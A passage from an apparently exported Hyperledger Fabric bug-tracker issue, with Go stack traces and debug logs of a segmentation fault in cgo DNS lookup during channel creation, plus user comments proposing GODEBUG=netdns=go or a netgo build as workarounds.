os/signal.loop()

 /opt/go/src/os/signal/signal_unix.go:22 +0x22

created by os/signal.init.1

 /opt/go/src/os/signal/signal_unix.go:28 +0x41

 

goroutine 11 [select]:

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).transportMonitor(0xc4200de700)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:941 +0x66c

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn.func1(0xc4200de700)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:656 +0x1de

created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:657 +0x756

 

goroutine 25 [runnable]:

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream.func3(0x1408880, 0xc420356000, 0xc4201b1040, 0xc420328420, 0xc42013e500)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:249

created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:269 +0xf12

 

goroutine 26 [select]:

net.lookupIPContext(0x1404980, 0xc420378180, 0x7ffe2f013a83, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0)

 /opt/go/src/net/lookup.go:122 +0x7bc

net.internetAddrList(0x1404980, 0xc420378180, 0xda2b97, 0x3, 0x7ffe2f013a83, 0x18, 0x0, 0x0, 0x0, 0xa, ...)

 /opt/go/src/net/ipsock.go:241 +0x5e0

net.resolveAddrList(0x1404980, 0xc420378180, 0xda3197, 0x4, 0xda2b97, 0x3, 0x7ffe2f013a83, 0x18, 0x0, 0x0, ...)

 /opt/go/src/net/dial.go:179 +0x106

net.(*Dialer).DialContext(0xc4200474f8, 0x1404980, 0xc420378180, 0xda2b97, 0x3, 0x7ffe2f013a83, 0x18, 0x0, 0x0, 0x0, ...)

 /opt/go/src/net/dial.go:329 +0x238

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.dialContext(0x1404980, 0xc420378180, 0xda2b97, 0x3, 0x7ffe2f013a83, 0x18, 0x0, 0x0, 0xc4203204b0, 0xc420374080)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/go17.go:53 +0xaa

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext.func1(0x7f919352e000, 0xc420378180, 0x7ffe2f013a83, 0x18, 0x1, 0x0, 0x13f6140, 0xc42014b690)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:341 +0x86

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newProxyDialer.func1(0x7f919352e000, 0xc420378180, 0x7ffe2f013a83, 0x18, 0x13, 0xc420034701, 0x0, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/proxy.go:136 +0x143

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.dial(0x7f919352e000, 0xc420378180, 0xc420368a20, 0x7ffe2f013a83, 0x18, 0x410a5e, 0xc42031ee60, 0xa0, 0x98)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:135 +0x5a

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client(0x7f919352e000, 0xc420378180, 0x7ffe2f013a83, 0x18, 0x0, 0x0, 0xdaeb89, 0x11, 0x0, 0x0, ...)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:173 +0xbf

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.NewClientTransport(0x7f919352e000, 0xc420378180, 0x7ffe2f013a83, 0x18, 0x0, 0x0, 0xdaeb89, 0x11, 0x0, 0x0, ...)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/transport.go:463 +0xae

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).resetTransport(0xc42033e540, 0xc420323800, 0xc42033e560, 0xc420034e10)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:876 +0x282

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn(0xc420358680, 0x7ffe2f013a83, 0x18, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:630 +0x41e

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext.func3(0xc420378060, 0xc420358680, 0x1406540, 0xc420126168, 0x7ffe2f013a83, 0x18)

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:429 +0x273

created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext

 /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:433 +0x429

 

goroutine 27 [select]:

net.cgoLookupIP(0x1404980, 0xc420378180, 0x7ffe2f013a83, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)

 /opt/go/src/net/cgo_unix.go:209 +0x2f5

net.lookupIP(0x1404980, 0xc420378180, 0x7ffe2f013a83, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0)

 /opt/go/src/net/lookup_unix.go:70 +0xf9

net.glob..func11(0x1404980, 0xc420378180, 0xe31498, 0x7ffe2f013a83, 0x13, 0xc42037e6c8, 0x71f959, 0xc42037e708, 0xc42037e718, 0x455cc0)

 /opt/go/src/net/hook.go:19 +0x52

net.lookupIPContext.func1(0xc420358680, 0x7ffe2f013a83, 0x18, 0x0)

 /opt/go/src/net/lookup.go:119 +0x5c

internal/singleflight.(*Group).doCall(0x1421860, 0xc42036a410, 0x7ffe2f013a83, 0x13, 0xc4203238f0)

 /opt/go/src/internal/singleflight/singleflight.go:93 +0x3c

created by internal/singleflight.(*Group).DoChan

 /opt/go/src/internal/singleflight/singleflight.go:86 +0x339

!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!

================== ERROR !!! FAILED to execute End-2-End Scenario ==================

 

^C

ubuntu@ip##########:~/godir/src/github.com/hyperledger/fabric/examples/e2e_cli$ go version

go version go1.8.3 linux/amd64",,chj050322,clessor,denyeart,huikang,mastersingh24,muralisr,sykesm,wutongtree,yoheiueda,YuRuan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8784,,,FAB-13419,,,,,,FAB-6045,FAB-13419,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzydin:",,,,,,,,,,,,,,,,,,,,,,,chj050322,clessor,denyeart,huikang,mastersingh24,muralisr,sykesm,wutongtree,yoheiueda,YuRuan,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Aug/17 1:47 AM;clessor;I got similar error running from the instructions for byfn.sh:

 

Build your first network (BYFN) end-to-end test

 

Channel name : mychannel

Creating channel...

CORE_PEER_TLS_ROOTCERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt

CORE_PEER_TLS_KEY_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.key

CORE_PEER_LOCALMSPID=Org1MSP

CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock

CORE_PEER_TLS_CERT_FILE=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/server.crt

CORE_PEER_TLS_ENABLED=true

CORE_PEER_MSPCONFIGPATH=/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp

CORE_PEER_ID=cli

CORE_LOGGING_LEVEL=DEBUG

CORE_PEER_ADDRESS=peer0.org1.example.com:7051

2017-08-18 16:43:00.765 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP

2017-08-18 16:43:00.765 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity

2017-08-18 16:43:00.775 UTC [channelCmd] InitCmdFactory -> INFO 003 Endorser and orderer connections initialized

2017-08-18 16:43:00.775 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP

2017-08-18 16:43:00.775 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity

2017-08-18 16:43:00.776 UTC [msp] GetLocalMSP -> DEBU 006 Returning existing local MSP

2017-08-18 16:43:00.776 UTC [msp] GetDefaultSigningIdentity -> DEBU 007 Obtaining default signing identity

2017-08-18 16:43:00.776 UTC [msp/identity] Sign -> DEBU 008 Sign: plaintext: 0A8C060A074F7267314D53501280062D...53616D706C65436F6E736F727469756D

2017-08-18 16:43:00.776 UTC [msp/identity] Sign -> DEBU 009 Sign: digest: 4030C9453426186836D1775D813821DFFDF2781DDBC7EA23C5FADFD27B91DE48

2017-08-18 16:43:00.776 UTC [msp] GetLocalMSP -> DEBU 00a Returning existing local MSP

2017-08-18 16:43:00.776 UTC [msp] GetDefaultSigningIdentity -> DEBU 00b Obtaining default signing identity

2017-08-18 16:43:00.776 UTC [msp] GetLocalMSP -> DEBU 00c Returning existing local MSP

2017-08-18 16:43:00.776 UTC [msp] GetDefaultSigningIdentity -> DEBU 00d Obtaining default signing identity

2017-08-18 16:43:00.776 UTC [msp/identity] Sign -> DEBU 00e Sign: plaintext: 0AC3060A1508021A060894B2DCCC0522...78744E313273F18331F5EAEBF4351838

2017-08-18 16:43:00.776 UTC [msp/identity] Sign -> DEBU 00f Sign: digest: 9D1CAFEA7DCA477F3492FFCD930C8A8427284442BBE36BD958D5862427644E74

2017-08-18 16:43:00.865 UTC [msp] GetLocalMSP -> DEBU 010 Returning existing local MSP

2017-08-18 16:43:00.865 UTC [msp] GetDefaultSigningIdentity -> DEBU 011 Obtaining default signing identity

2017-08-18 16:43:00.865 UTC [msp] GetLocalMSP -> DEBU 012 Returning existing local MSP

2017-08-18 16:43:00.865 UTC [msp] GetDefaultSigningIdentity -> DEBU 013 Obtaining default signing identity

2017-08-18 16:43:00.865 UTC [msp/identity] Sign -> DEBU 014 Sign: plaintext: 0AC3060A1508021A060894B2DCCC0522...1DB4630ED7AE12080A021A0012021A00

2017-08-18 16:43:00.865 UTC [msp/identity] Sign -> DEBU 015 Sign: digest: B6D29E57222F8CC08885D78EA599EDE7CA2707F4F7258077E92BDA03E7F17894

{color:#ff0000}*2017-08-18 16:43:00.866 UTC [channelCmd] readBlock -> DEBU 016 Got status: &\{NOT_FOUND}*{color}

2017-08-18 16:43:00.866 UTC [msp] GetLocalMSP -> DEBU 017 Returning existing local MSP

2017-08-18 16:43:00.866 UTC [msp] GetDefaultSigningIdentity -> DEBU 018 Obtaining default signing identity

fatal error: unexpected signal during runtime execution

[signal SIGSEGV: segmentation violation code=0x1 addr=0x63 pc=0x7f233082d259]

 

runtime stack:

runtime.throw(0xdc9844, 0x2a)

/opt/go/src/runtime/panic.go:566 +0x95

runtime.sigpanic()

/opt/go/src/runtime/sigpanic_unix.go:12 +0x2cc

 

goroutine 38 [syscall, locked to thread]:

runtime.cgocall(0xb0e530, 0xc4203a45f8, 0xc400000000)

/opt/go/src/runtime/cgocall.go:131 +0x110 fp=0xc4203a45b0 sp=0xc4203a4570

net._C2func_getaddrinfo(0x7f23240008c0, 0x0, 0xc420394390, 0xc420126578, 0x0, 0x0, 0x0)

??:0 +0x68 fp=0xc4203a45f8 sp=0xc4203a45b0

net.cgoLookupIPCNAME(0x7ffd2e697a83, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)

/opt/go/src/net/cgo_unix.go:146 +0x37c fp=0xc4203a4718 sp=0xc4203a45f8

net.cgoIPLookup(0xc42037d320, 0x7ffd2e697a83, 0x13)

/opt/go/src/net/cgo_unix.go:198 +0x4d fp=0xc4203a47a8 sp=0xc4203a4718

runtime.goexit()

/opt/go/src/runtime/asm_amd64.s:2086 +0x1 fp=0xc4203a47b0 sp=0xc4203a47a8

created by net.cgoLookupIP

/opt/go/src/net/cgo_unix.go:208 +0xb4

 

goroutine 1 [select]:

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).wait(0xc4200dc380, 0x7f2330bafb30, 0xc4203ba990, 0xc420180100, 0x8046c0, 0x7f2330bafb30, 0xc4203ba990, 0x0)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:1032 +0x183

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).getTransport(0xc42007bba0, 0x7f2330bafb30, 0xc4203ba990, 0xc4203ba900, 0x7f2330bafb30, 0xc4203ba960, 0x19, 0x0, 0xc420189900)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:724 +0x2f7

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newClientStream(0x7f2330bafb30, 0xc4203ba990, 0x13e9f40, 0xc42007bba0, 0xdbdf1f, 0x20, 0x0, 0x0, 0x0, 0x0, ...)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:189 +0x599

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.NewClientStream(0x7f2330bafab0, 0xc420012290, 0x13e9f40, 0xc42007bba0, 0xdbdf1f, 0x20, 0x0, 0x0, 0x0, 0x18, ...)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/stream.go:105 +0x162

github.com/hyperledger/fabric/protos/orderer.(*atomicBroadcastClient).Deliver(0xc4200282e8, 0x7f2330bafab0, 0xc420012290, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0xa0)

/opt/gopath/src/github.com/hyperledger/fabric/protos/orderer/ab.pb.go:499 +0xba

github.com/hyperledger/fabric/peer/channel.InitCmdFactory(0xc420330100, 0x0, 0x0, 0x13f6140)

/opt/gopath/src/github.com/hyperledger/fabric/peer/channel/channel.go:179 +0x2c0

github.com/hyperledger/fabric/peer/channel.getGenesisBlock(0xc42031d400, 0x0, 0x0, 0x0)

/opt/gopath/src/github.com/hyperledger/fabric/peer/channel/deliverclient.go:141 +0x11c

github.com/hyperledger/fabric/peer/channel.executeCreate(0xc42031d400, 0xc42031d400, 0x0)

/opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:183 +0x50

github.com/hyperledger/fabric/peer/channel.create(0xc4202478c0, 0xc420336140, 0x1, 0xa, 0xc42031d400, 0xda37c3, 0x5)

/opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:213 +0x45

github.com/hyperledger/fabric/peer/channel.createCmd.func1(0xc4202478c0, 0xc420336140, 0x1, 0xa, 0x0, 0x0)

/opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:59 +0x52

github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).execute(0xc4202478c0, 0xc420336000, 0xa, 0xa, 0xc4202478c0, 0xc420336000)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:599 +0x234

github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).ExecuteC(0x13ed8c0, 0xf, 0xc420010035, 0x7)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:689 +0x367

github.com/hyperledger/fabric/vendor/github.com/spf13/cobra.(*Command).Execute(0x13ed8c0, 0x7d, 0xc420010035)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/github.com/spf13/cobra/command.go:648 +0x2b

main.main()

/opt/gopath/src/github.com/hyperledger/fabric/peer/main.go:118 +0x54e

 

goroutine 17 [syscall, locked to thread]:

runtime.goexit()

/opt/go/src/runtime/asm_amd64.s:2086 +0x1

 

goroutine 37 [select]:

net.cgoLookupIP(0x1404980, 0xc42037d260, 0x7ffd2e697a83, 0x13, 0x455ed0, 0xc42007b380, 0x4, 0xc420025e30, 0x4056be, 0xc42007b380)

/opt/go/src/net/cgo_unix.go:209 +0x2f5

net.lookupIP(0x1404980, 0xc42037d260, 0x7ffd2e697a83, 0x13, 0xc42018a2d0, 0xc420025f60, 0xc420025ea8, 0x0, 0x7f232c0008c0)

/opt/go/src/net/lookup_unix.go:70 +0xf9

net.glob..func11(0x1404980, 0xc42037d260, 0xe314a0, 0x7ffd2e697a83, 0x13, 0xc420025ec8, 0x71f959, 0xc420025f08, 0xc420025f18, 0x455cc0)

/opt/go/src/net/hook.go:19 +0x52

net.lookupIPContext.func1(0xc42007bba0, 0x7ffd2e697a83, 0x18, 0x0)

/opt/go/src/net/lookup.go:119 +0x5c

internal/singleflight.(*Group).doCall(0x1421860, 0xc42034de00, 0x7ffd2e697a83, 0x13, 0xc420394330)

/opt/go/src/internal/singleflight/singleflight.go:93 +0x3c

created by internal/singleflight.(*Group).DoChan

/opt/go/src/internal/singleflight/singleflight.go:86 +0x339

 

goroutine 21 [syscall]:

os/signal.signal_recv(0x0)

/opt/go/src/runtime/sigqueue.go:116 +0x157

os/signal.loop()

/opt/go/src/os/signal/signal_unix.go:22 +0x22

created by os/signal.init.1

/opt/go/src/os/signal/signal_unix.go:28 +0x41

 

goroutine 12 [select]:

net.lookupIPContext(0x1404980, 0xc42037d260, 0x7ffd2e697a83, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0)

/opt/go/src/net/lookup.go:122 +0x7bc

net.internetAddrList(0x1404980, 0xc42037d260, 0xda2b97, 0x3, 0x7ffd2e697a83, 0x18, 0x0, 0x0, 0x0, 0x0, ...)

/opt/go/src/net/ipsock.go:241 +0x5e0

net.resolveAddrList(0x1404980, 0xc42037d260, 0xda3197, 0x4, 0xda2b97, 0x3, 0x7ffd2e697a83, 0x18, 0x0, 0x0, ...)

/opt/go/src/net/dial.go:179 +0x106

net.(*Dialer).DialContext(0xc4200536c8, 0x1404980, 0xc42037d260, 0xda2b97, 0x3, 0x7ffd2e697a83, 0x18, 0x0, 0x0, 0x0, ...)

/opt/go/src/net/dial.go:329 +0x238

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.dialContext(0x1404980, 0xc42037d260, 0xda2b97, 0x3, 0x7ffd2e697a83, 0x18, 0x0, 0x0, 0xc42013aa50, 0xc420363c80)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/go17.go:53 +0xaa

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext.func1(0x7f23313e8028, 0xc42037d260, 0x7ffd2e697a83, 0x18, 0x1, 0x0, 0x13f6140, 0xc42012d920)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:341 +0x86

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.newProxyDialer.func1(0x7f23313e8028, 0xc42037d260, 0x7ffd2e697a83, 0x18, 0x13, 0x410a5e, 0x0, 0x0)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/proxy.go:136 +0x143

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.dial(0x7f23313e8028, 0xc42037d260, 0xc4201818c0, 0x7ffd2e697a83, 0x18, 0x410a5e, 0xc420337540, 0xa0, 0x98)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:135 +0x5a

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.newHTTP2Client(0x7f23313e8028, 0xc42037d260, 0x7ffd2e697a83, 0x18, 0x0, 0x0, 0xdaeb89, 0x11, 0x0, 0x0, ...)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/http2_client.go:173 +0xbf

github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport.NewClientTransport(0x7f23313e8028, 0xc42037d260, 0x7ffd2e697a83, 0x18, 0x0, 0x0, 0xdaeb89, 0x11, 0x0, 0x0, ...)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/transport/transport.go:463 +0xae

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*addrConn).resetTransport(0xc4200dc380, 0x0, 0xc42010b920, 0x0)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:876 +0x282

github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn.func1(0xc4200dc380)

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:648 +0x34

created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*ClientConn).resetAddrConn

/opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:657 +0x756

!!!!!!!!!!!!!!! Channel creation failed !!!!!!!!!!!!!!!!

========= ERROR !!! FAILED to execute End-2-End Scenario ===========

 

 ;;;","12/Oct/17 6:55 PM;chj050322;i also get the same error;;;","20/Oct/17 10:26 AM;YuRuan;Looks like an issue with DNS. Maybe /etc/resolv.conf specify some features that the pure Go resolver does not support, so fallback to use cgo instead.

Add GODEBUG=netdns=go in compose file may help.;;;","25/Nov/17 4:51 AM;mastersingh24;At this point, not sure what we should do.  We could just document this is the FAQ/Troubleshooting and have people set 
{{GODEBUG=netdns=go}}

The other option to explore would be to use the {{netgo}} build tag for the binaries in our Docker images;;;","25/Nov/17 4:52 AM;mastersingh24;Going to assign to myself so I remember to come back to this one after doing some more thinking on it;;;","07/Feb/18 1:53 AM;thejibz;Hello,

Was just going to try the getting started and got this error ! I think it should be fixed in order to not discourage newcomers.;;;","08/Feb/18 1:07 PM;muralisr;[~clessor][~mastersingh24] [~denyeart] this doesn't look like it belongs to ""fabric-chaintool"" component....perhaps meant ""fabric-tools"" ?;;;","09/Feb/18 6:57 AM;mastersingh24;[~muralisr] - I switched it to fabric-build and fabric-samples as I believe it's possible to ""fix"" this in either place.;;;","09/Feb/18 6:59 AM;mastersingh24;[~thejibz] - Could you describe your runtime environment a bit?  Host operating system, Docker version, etc.  I assume you were also trying the fabric-examples?;;;","14/Feb/18 3:35 AM;Clayton Sims;Moving status to Monitor / Hold.   This means we are waiting on originator for information, etc. ;;;","15/Feb/18 4:04 AM;denyeart;I don't think enough is known about the problem to fix in 1.1 timeframe.  Moving to 1.2.  Please correct me if there are known fix options in 1.1 timeframe.;;;","14/Apr/18 11:06 AM;huikang;I am having the same issue when running the command `` docker-compose -f docker-compose-simple.yaml up`` following the tutorial [1].

My OS is Linux 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux.

 [1] [http://hyperledger-fabric.readthedocs.io/en/release-1.1/chaincode4ade.html#terminal-1-start-the-network]

The problem happens to the cli container as you see below

 

~/fabric-samples# docker ps -a

CONTAINER ID        IMAGE                        COMMAND                  CREATED             STATUS                        PORTS               NAMES

8c7f92ceb41f        hyperledger/fabric-tools     ""/bin/bash -c ./scri…""   7 minutes ago       Exited (2) 7 minutes ago                          cli

 

The error log inside the container is

docker logs -f 8c7f92ceb41f 2018-04-13 21:32:40.601 UTC [msp] GetLocalMSP -> DEBU 001 Returning existing local MSP 2018-04-13 21:32:40.601 UTC [msp] GetDefaultSigningIdentity -> DEBU 002 Obtaining default signing identity 2018-04-13 21:32:40.604 UTC [channelCmd] InitCmdFactory -> INFO 003 Endorser and orderer connections initialized 2018-04-13 21:32:40.605 UTC [msp] GetLocalMSP -> DEBU 004 Returning existing local MSP 2018-04-13 21:32:40.605 UTC [msp] GetDefaultSigningIdentity -> DEBU 005 Obtaining default signing identity 2018-04-13 21:32:40.605 UTC [msp] GetLocalMSP -> DEBU 006 Returning existing local MSP 2018-04-13 21:32:40.605 UTC [msp] GetDefaultSigningIdentity -> DEBU 007 Obtaining default signing identity 2018-04-13 21:32:40.605 UTC [msp/identity] Sign -> DEBU 008 Sign: plaintext: 0AC6060A0744454641554C5412BA062D...53616D706C65436F6E736F727469756D 2018-04-13 21:32:40.605 UTC [msp/identity] Sign -> DEBU 009 Sign: digest: 0503A9E4B84780E099D16FD46DEDD8E0441FF0132EE4CF7110DC7E6415E42C76 2018-04-13 21:32:40.606 UTC [msp] GetLocalMSP -> DEBU 00a Returning existing local MSP 2018-04-13 21:32:40.606 UTC [msp] GetDefaultSigningIdentity -> DEBU 00b Obtaining default signing identity 2018-04-13 21:32:40.606 UTC [msp] GetLocalMSP -> DEBU 00c Returning existing local MSP 2018-04-13 21:32:40.606 UTC [msp] GetDefaultSigningIdentity -> DEBU 00d Obtaining default signing identity 2018-04-13 21:32:40.606 UTC [msp/identity] Sign -> DEBU 00e Sign: plaintext: 0AF7060A0F08021A0608F8C3C4D60522...1F0ECDD5BEA1CE8782AEEF5DD6909D37 2018-04-13 21:32:40.606 UTC [msp/identity] Sign -> DEBU 00f Sign: digest: 54A622076C037EC8961940AE2A9F18110A1869B02979CD341FA59D2B726D1146 2018-04-13 21:32:40.640 UTC [msp] GetLocalMSP -> DEBU 010 Returning existing local MSP 2018-04-13 21:32:40.640 UTC [msp] GetDefaultSigningIdentity -> DEBU 011 Obtaining default signing identity 2018-04-13 21:32:40.641 UTC [msp] GetLocalMSP -> DEBU 012 Returning existing local MSP 2018-04-13 21:32:40.641 UTC [msp] GetDefaultSigningIdentity -> DEBU 013 Obtaining default signing identity 2018-04-13 21:32:40.641 UTC [msp/identity] Sign -> DEBU 014 Sign: plaintext: 0AF7060A0F08021A0608F8C3C4D60522...541E7524656212080A021A0012021A00 2018-04-13 21:32:40.641 UTC [msp/identity] Sign -> DEBU 015 Sign: digest: A7FDF6A6A22DB2D2D624DC3B1719C1D6DC8FE3EE296EB92496B17FB73CB00068 2018-04-13 21:32:40.642 UTC [channelCmd] readBlock -> DEBU 016 Got status: &\{NOT_FOUND} 2018-04-13 21:32:40.642 UTC [msp] GetLocalMSP -> DEBU 017 Returning existing local MSP 2018-04-13 21:32:40.642 UTC [msp] GetDefaultSigningIdentity -> DEBU 018 Obtaining default signing identity fatal error: unexpected signal during runtime execution [signal SIGSEGV: segmentation violation code=0x1 addr=0x63 pc=0x7fcf41e5c259] runtime stack: runtime.throw(0xf11259, 0x2a) /opt/go/src/runtime/panic.go:605 +0x95 runtime.sigpanic() /opt/go/src/runtime/signal_unix.go:351 +0x2b8 goroutine 46 [syscall, locked to thread]: runtime.cgocall(0xbf3800, 0xc4203ed5e8, 0xf0fa21) /opt/go/src/runtime/cgocall.go:132 +0xe4 fp=0xc4203ed5a8 sp=0xc4203ed568 pc=0x4023b4 net._C2func_getaddrinfo(0x7fcf340008c0, 0x0, 0xc42044a360, 0xc4200785e0, 0x0, 0x0, 0x0) net/_obj/_cgo_gotypes.go:86 +0x5f fp=0xc4203ed5e8 sp=0xc4203ed5a8 pc=0x5f893f net.cgoLookupIPCNAME.func2(0x7fcf340008c0, 0x0, 0xc42044a360, 0xc4200785e0, 0xc420450060, 0x7ffed2e5ee02, 0x7) /opt/go/src/net/cgo_unix.go:151 +0x13f fp=0xc4203ed640 sp=0xc4203ed5e8 pc=0x5ffedf net.cgoLookupIPCNAME(0x7ffed2e5ee02, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0) /opt/go/src/net/cgo_unix.go:151 +0x175 fp=0xc4203ed738 sp=0xc4203ed640 pc=0x5fa195 net.cgoIPLookup(0xc4204501e0, 0x7ffed2e5ee02, 0x7) /opt/go/src/net/cgo_unix.go:203 +0x4d fp=0xc4203ed7c8 sp=0xc4203ed738 pc=0x5fa8dd runtime.goexit() /opt/go/src/runtime/asm_amd64.s:2337 +0x1 fp=0xc4203ed7d0 sp=0xc4203ed7c8 pc=0x45e391 created by net.cgoLookupIP /opt/go/src/net/cgo_unix.go:213 +0xaf goroutine 1 [select]: github.com/hyperledger/fabric/vendor/google.golang.org/grpc.DialContext(0x7fcf42a24a38, 0xc420407f80, 0x7ffed2e5ee02, 0xc, 0xc42040e840, 0x4, 0x4, 0x0, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/clientconn.go:422 +0x532 github.com/hyperledger/fabric/core/comm.(*grpcClient).NewConnection(0xc4203bceb0, 0x7ffed2e5ee02, 0xc, 0x0, 0x0, 0x0, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/core/comm/client.go:217 +0x389 github.com/hyperledger/fabric/peer/common.(*OrdererClient).Deliver(0xc42044a210, 0x0, 0x0, 0x20, 0xd662c0) /opt/gopath/src/github.com/hyperledger/fabric/peer/common/ordererclient.go:61 +0x6c github.com/hyperledger/fabric/peer/channel.newDeliverClient(0x7ffed2e5edf1, 0x3, 0xee710d, 0x1, 0xc42040e800) /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/deliverclient.go:51 +0x143 github.com/hyperledger/fabric/peer/channel.InitCmdFactory(0xc4203c0100, 0x0, 0x0, 0x16571c0) /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/channel.go:152 +0x233 github.com/hyperledger/fabric/peer/channel.getGenesisBlock(0xc4202bbea0, 0x0, 0x0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/deliverclient.go:167 +0x124 github.com/hyperledger/fabric/peer/channel.executeCreate(0xc4202bbea0, 0xc4202bbea0, 0x0) /opt/gopath/src/github.com/hyperledger/fabric/peer/channel/create.go:183 +0x50 github.com/hyperledger/fabric/peer/channel.create(0xc42024f200, 0xc4202d14a0, 0x0, 0x6, 0x0, 0xd5afc0, 